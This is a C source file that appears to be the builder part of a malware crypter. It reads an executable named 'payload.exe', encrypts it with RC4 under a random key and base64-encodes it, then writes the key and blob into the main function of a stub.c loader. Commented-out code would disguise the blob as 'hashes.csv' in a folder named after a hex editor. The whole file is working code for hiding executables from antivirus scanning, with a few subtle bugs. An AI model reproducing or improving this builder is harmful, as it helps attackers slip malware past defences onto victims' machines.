#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>
#include <sys/stat.h>

static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";
#define SWAP(a, b) { unsigned char temp = a; a = b; b = temp; }

int load_binary(const char *path, unsigned char **bytes_array, size_t *num_bytes);
char* get_file_path(void);
void pad_with_random_bytes(unsigned char *data, size_t data_len, size_t n);
void rc4_init(unsigned char *key, size_t key_length, unsigned char *state);
void rc4_crypt(unsigned char *data, size_t data_length, unsigned char *state, unsigned char *output);
void initRandom(void);
char randomBase64Char(void);
void generateRandomBase64String(char *str, int length);
char* bytes_to_base64(const unsigned char* data, size_t input_length);
char* insertNewLines(const char* input);
int save_string_to_file_in_directory(const char *directory, const char *filename, const char *content);
int ensure_directory_exists(const char *path);
void save_text_to_data_directory(const char *content);
char* concat_with_newline(const char* s1, const char* s2);
char* concat(const char* s1, const char* s2);
char* readFileContents(const char* filename);
char* insertPayload(const char *stubString, const char *payloadString);

int main() {

    // get payload path from user
    const char *defaultPayloadPath = "payload.exe";
    // char * payloadPath = get_file_path();
    // printf("File path is: %s\n", payloadPath);

    // load payload into a bytes array
    unsigned char *payloadBytes;
    size_t payloadSizeBytes;
    int check = load_binary(defaultPayloadPath, &payloadBytes, &payloadSizeBytes);
    if (check != 0) {
        printf("Error loading binary into memory.");
        exit(1);
    }

    // pad bytes with random bytes
    // int numBytesToPadWith = 512;
    // uint64_t padSizeComplement = UINT64_MAX - numBytesToPadWith;
    // pad_with_random_bytes(payloadBytes, payloadSizeBytes, numBytesToPadWith);
    // size_t payloadSizeBytesAfterPad = payloadSizeBytes + numBytesToPadWith;
    
    // generate the key
    initRandom();
    unsigned char key[65];
    generateRandomBase64String(key, 64);
    // unsigned char key[]; // Example key
    size_t key_length = sizeof(key) - 1;
    printf("The key is: %s\n", key);

    // encrypt payload
    unsigned char state[256];
    unsigned char encrypted[payloadSizeBytes];

    // Initialize RC4 state with the key
    rc4_init(key, key_length, state);

    // Encrypt the payload
    rc4_crypt(payloadBytes, payloadSizeBytes, state, encrypted);
    // printf("Encrypted: ");
    // for (size_t i = 0; i < payloadSizeBytes; i++) {
    //     printf("%02X ", encrypted[i]);
    // }
    // printf("\n");

    // add compression

    // convert to base64
    char* payloadEncryptedBase64 = bytes_to_base64(encrypted, payloadSizeBytes);
    // if (base64_encoded_data) {
    //     printf("Encoded: %s\n", base64_encoded_data);
    //     free(base64_encoded_data);
    // }

    // concatenat key and payload
    char* temp1 = concat(key, payloadEncryptedBase64);
    char* temp2 = concat("char* payload = \"", temp1);
    char* keyWithPayload = concat(temp2, "\";\n");
    // printf("%s\n", keyWithPayload);

    // get stub file
    const char* filename = "stub.c";
    char* fileContents = readFileContents(filename);

    // modify stub file
    char* newStub = insertPayload(fileContents, keyWithPayload);
    // printf("%s\n", newStub);


    // save stub to disk
    FILE* file = fopen("stub.c", "w");
    if (file == NULL) {
        printf("Error opening file!\n");
        return 1; // Return an error code
    }
    // Write the string to the file
    fprintf(file, "%s", newStub);
    fclose(file);
    printf("New stub.c file saved to disk.\n");



    // // split string into 64 character chunks
    // char* payloadEncryptedBase64csv = insertNewLines(payloadEncryptedBase64);
    // // printf("%s\n", payloadEncryptedBase64csv);

    // // save to disk
    // save_text_to_data_directory(concat_with_newline(key, payloadEncryptedBase64csv));



    free(payloadBytes);
    // free(key);
    // free(encrypted);

    return 0;
}


char* insertPayload(const char *stubString, const char *payloadString) {
    const char *pattern = "int main() {";
    const char *insertPoint = strstr(stubString, pattern);

    if (insertPoint == NULL) {
        printf("Pattern not found in stubString.\n");
        return NULL; // Pattern not found
    }

    // Calculate where to insert the payload
    size_t insertPos = insertPoint - stubString + strlen(pattern);

    // Calculate the new size needed
    size_t newSize = strlen(stubString) + strlen("\n    ") + strlen(payloadString) + 1; // +1 for null terminator
    char *newString = (char *)malloc(newSize);

    if (newString == NULL) {
        printf("Memory allocation failed\n");
        return NULL; // Memory allocation failed
    }

    // Copy up to the insertion point
    strncpy(newString, stubString, insertPos);
    newString[insertPos] = '\0'; // Null-terminate

    // Insert "\n    " and payloadString
    strcat(newString, "\n    ");
    strcat(newString, payloadString);

    // Append the rest of the original stubString
    strcat(newString, stubString + insertPos);

    return newString;
}

char* readFileContents(const char* filename) {
    FILE* file = fopen(filename, "r"); // Open the file for reading
    if (file == NULL) {
        printf("Failed to open the file.\n");
        return NULL;
    }

    // Seek to the end of the file to determine its size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file); // Go back to the start of the file

    // Allocate memory for the entire file content plus null terminator
    char* buffer = (char*)malloc(fileSize + 1);
    if (buffer == NULL) {
        printf("Memory allocation failed.\n");
        fclose(file);
        return NULL;
    }

    // Read the file into the buffer and null-terminate the string
    fread(buffer, 1, fileSize, file);
    buffer[fileSize] = '\0';

    // Close the file
    fclose(file);

    return buffer;
}

char* concat(const char* s1, const char* s2) {
    // Allocate memory for the concatenated string
    char* result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null terminator
    if (result == NULL) { // Always check if malloc was successful
        printf("Memory allocation failed\n");
        exit(1); // Exit if memory allocation fails
    }

    strcpy(result, s1); // Copy the first string into result
    strcat(result, s2); // Concatenate the second string onto result

    return result; // Return the concatenated string
}

char* concat_with_newline(const char* s1, const char* s2) {
    // +2 for newline and null terminator
    size_t len = strlen(s1) + strlen(s2) + 2;
    char* result = (char*)malloc(len);

    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        exit(EXIT_FAILURE);
    }

    strcpy(result, s1);
    strcat(result, "\n");
    strcat(result, s2);

    return result; // Caller must free this memory
}

void save_text_to_data_directory(const char *content) {
    const char *baseDir = "HxD64";
    const char *dataDir = "HxD64/data";
    const char *filename = "hashes.csv";

    if (ensure_directory_exists(baseDir) != 0 || ensure_directory_exists(dataDir) != 0) {
        fprintf(stderr, "Error creating directories.\n");
        return; // Exit the function if directory creation fails
    }

    if (save_string_to_file_in_directory(dataDir, filename, content) != 0) {
        fprintf(stderr, "Error saving file.\n");
        return; // Exit the function if file saving fails
    }

    printf("File successfully saved to %s/%s\n", dataDir, filename);
}

// Function to check if a directory exists, and create it if it doesn't.
// Returns 0 on success, -1 on failure.
int ensure_directory_exists(const char *path) {
    struct stat st = {0};

    // Check if directory exists
    if (stat(path, &st) == -1) {
        // Attempt to create the directory
        if (mkdir(path, 0700) == -1) {
            perror("Failed to create directory");
            return -1;
        }
    }
    return 0;
}

// Function to save a string to a text file within the specified directory.
// Returns 0 on success, -1 on failure.
int save_string_to_file_in_directory(const char *directory, const char *filename, const char *content) {
    char filepath[1024];
    
    // Construct the filepath
    snprintf(filepath, sizeof(filepath), "%s/%s", directory, filename);

    // Open the file for writing
    FILE *file = fopen(filepath, "w");
    if (!file) {
        perror("Failed to open file for writing");
        return -1;
    }

    // Write the string to the file
    if (fprintf(file, "%s", content) < 0) {
        fclose(file);
        perror("Failed to write to file");
        return -1;
    }

    // Close the file
    fclose(file);
    return 0;
}


// Function to insert newline characters into a string after every 64 characters
char* insertNewLines(const char* input) {
    // Calculate the length of the input string
    int inputLen = strlen(input);

    // Calculate the number of newline characters to be added
    int newLineCount = inputLen / 64;

    // Allocate memory for the new string
    // +1 for the null terminator at the end of the string
    char* output = malloc(inputLen + newLineCount + 1);

    if (output == NULL) {
        printf("Memory allocation failed\n");
        return NULL; // Return NULL if memory allocation fails
    }

    int inputIndex = 0, outputIndex = 0;
    while (input[inputIndex] != '\0') {
        // Copy the character from the input to the output string
        output[outputIndex++] = input[inputIndex++];

        // After every 64 characters, insert a newline
        if (inputIndex % 64 == 0) {
            output[outputIndex++] = '\n';
        }
    }

    // Null-terminate the output string
    output[outputIndex] = '\0';

    return output;
}

char* bytes_to_base64(const unsigned char* data, size_t input_length) {
    size_t output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = (char*)malloc(output_length + 1); // +1 for null terminator
    if (encoded_data == NULL) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded_data[j++] = base64_chars[(triple >> 18) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 12) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 6) & 0x3F];
        encoded_data[j++] = base64_chars[triple & 0x3F];
    }

    int mod_table[] = {0, 2, 1};
    for (size_t i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[output_length - 1 - i] = '=';

    encoded_data[output_length] = '\0'; // Null-terminate the string

    return encoded_data;
}


// Function to initialize the random number generator. Call this once at the start of your program.
void initRandom() {
    srand((unsigned int)time(NULL));
}

// Function to generate a random base-64 character
char randomBase64Char() {
    char base64Chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int randomIndex = rand() % 64; // rand() returns a pseudo-random integer. % 64 ensures it's within 0-63.
    return base64Chars[randomIndex];
}

// Function to generate a random base-64 string of length 64
void generateRandomBase64String(char *str, int length) {
    for (int i = 0; i < length; ++i) {
        str[i] = randomBase64Char();
    }
    str[length] = '\0'; // Null-terminate the string
}

// Function to initialize the state array
void rc4_init(unsigned char *key, size_t key_length, unsigned char *state) {
    for (int i = 0; i < 256; i++) {
        state[i] = i;
    }

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + state[i] + key[i % key_length]) % 256;
        SWAP(state[i], state[j]);
    }
}

// Function to generate RC4 stream and encrypt or decrypt data
void rc4_crypt(unsigned char *data, size_t data_length, unsigned char *state, unsigned char *output) {
    int i = 0, j = 0;
    for (size_t n = 0; n < data_length; n++) {
        i = (i + 1) % 256;
        j = (j + state[i]) % 256;
        SWAP(state[i], state[j]);
        unsigned char rnd = state[(state[i] + state[j]) % 256];
        output[n] = rnd ^ data[n];
    }
}



void pad_with_random_bytes(unsigned char *data, size_t data_len, size_t n) {
  // Check for invalid input
  if (data == NULL || n <= 0) {
    return; // Do nothing if data is NULL or n is non-positive
  }

  // Seed the random number generator (important for randomness)
  srand(time(NULL));

  // Allocate memory for the padded data
  unsigned char *padded_data = realloc(data, data_len + n);

  // Check if memory allocation was successful
  if (padded_data == NULL) {
    return; // Do nothing if memory allocation fails
  }

  // Update the data pointer to point to the padded data
  data = padded_data;

  // Fill the padding bytes with random values
  for (size_t i = 0; i < n; ++i) {
    data[data_len + i] = rand() % 256; // Generate a random value between 0 and 255
  }
}

int load_binary(const char *path, unsigned char **bytes_array, size_t *num_bytes) {
    FILE *fp = fopen(path, "rb"); // Open file in binary read mode
    if (fp == NULL) {
        fprintf(stderr, "Error opening file '%s'\n", path);
        return -1;
    }

    // Get file size
    if (fseek(fp, 0, SEEK_END) != 0) { // Seek to end of file
        fprintf(stderr, "Error seeking to end of file\n");
        fclose(fp);
        return -1;
    }
    *num_bytes = ftell(fp); // Get current file position (size)
    if (*num_bytes == -1L) {
        fprintf(stderr, "Error getting file size\n");
        fclose(fp);
        return -1;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) { // Seek back to beginning
        fprintf(stderr, "Error seeking to beginning of file\n");
        fclose(fp);
        return -1;
    }

    // Allocate memory for the bytes array
    *bytes_array = (unsigned char *)malloc(*num_bytes);
    if (*bytes_array == NULL) {
        fprintf(stderr, "Error allocating memory\n");
        fclose(fp);
        return -1;
    }

    // Read file contents into the bytes array
    size_t bytes_read = fread(*bytes_array, 1, *num_bytes, fp);
    if (bytes_read != *num_bytes) {
        fprintf(stderr, "Error reading file: %zu bytes read instead of %zu\n", bytes_read, *num_bytes);
        free(*bytes_array);
        *bytes_array = NULL;
        fclose(fp);
        return -1;
    }

    fclose(fp); // Close the file
    return 0; // Success
}

char* get_file_path(void) {
    int MAX_PATH_LENGTH = 256;

    char path[MAX_PATH_LENGTH];

    printf("Enter the file path for the payload: ");

    // Read the path from the user
    if (fgets(path, MAX_PATH_LENGTH, stdin) == NULL) {
    fprintf(stderr, "Error reading file path.\n");
    return NULL;
    }

    // Remove the newline character at the end (if present)
    path[strcspn(path, "\n")] = '\0';

    // Allocate memory for the path (dynamically)
    char *allocated_path = malloc(strlen(path) + 1);
    if (allocated_path == NULL) {
    fprintf(stderr, "Error allocating memory for path.\n");
    return NULL;
    }

    // Copy the path to the allocated memory
    strcpy(allocated_path, path);

    return allocated_path;
}

